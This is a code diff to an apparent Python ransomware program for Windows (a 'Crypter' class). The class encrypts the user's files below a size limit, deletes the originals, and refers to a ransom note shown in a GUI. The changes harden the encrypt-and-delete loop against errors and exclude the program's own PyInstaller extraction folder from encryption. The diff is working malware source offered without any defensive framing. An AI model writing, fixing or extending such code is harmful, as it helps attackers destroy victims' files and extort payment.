@@ -8,6 +8,7 @@
 import os
 import sys
 import win32api
+import win32file
 import winerror
 import win32event
 import _winreg
@@ -190,19 +191,19 @@ class Crypter(Base.Base):
     for file in file_list:
 
       # Encrypt file if less than specified file size
-      if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
-        is_encrypted = self.Crypt.encrypt_file(file, self.__config["encrypted_file_extension"])
-      else:
-        is_encrypted = False
+      try:
+        if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
+          is_encrypted = self.Crypt.encrypt_file(file, self.__config["encrypted_file_extension"])
+        else:
+          is_encrypted = False
 
-      # IF encrypted, try to delete the file and add to the list
-      if is_encrypted:
-        try:
+        # IF encrypted, try to delete the file and add to the list
+        if is_encrypted:
           os.remove(file)
+          encrypted_files.append(file)
+      except:
         # Ignore any exception, such as access denied, and continue
-        except:
-          continue
-        encrypted_files.append(file)
+        pass
 
     # Write out list of encrypted files
     if encrypted_files or (not self.__config["encrypt_user_home"] and not self.__config["encrypt_attached_drives"]):
@@ -231,7 +232,8 @@ class Crypter(Base.Base):
             if (
                 (self.is_valid_filetype(file)) and
                 (file.lower() not in self.FILES_TO_EXCLUDE) and
-                (file.lower() != binary_name.lower())
+                (file.lower() != binary_name.lower()) and
+                (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
                 ):
                     file_list.append(os.path.join(path, file))
         for file in subdirs:
@@ -240,7 +242,8 @@ class Crypter(Base.Base):
             if (
                 (self.is_valid_filetype(file)) and
                 (file.lower() not in self.FILES_TO_EXCLUDE) and
-                (file.lower() != binary_name.lower())
+                (file.lower() != binary_name.lower()) and
+                (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
                 ):
                     file_list.append(os.path.join(path, file))
 
@@ -272,16 +275,11 @@ class Crypter(Base.Base):
         
     return False
         
-
   
-  
-    return False
-
-
   def set_wallpaper(self):
     '''
     @summary: Sets the users wallpaper to a specific ransom not image
-    @attention: FUNCTION NOW OBSOLETE. This method, and approach, is no longer used. The ransom
+    @deprecated: This method, and approach, is no longer used. The ransom
     note is now displayed via a WX GUI
     @requires: To enable this method, add an import for ctypes
     '''
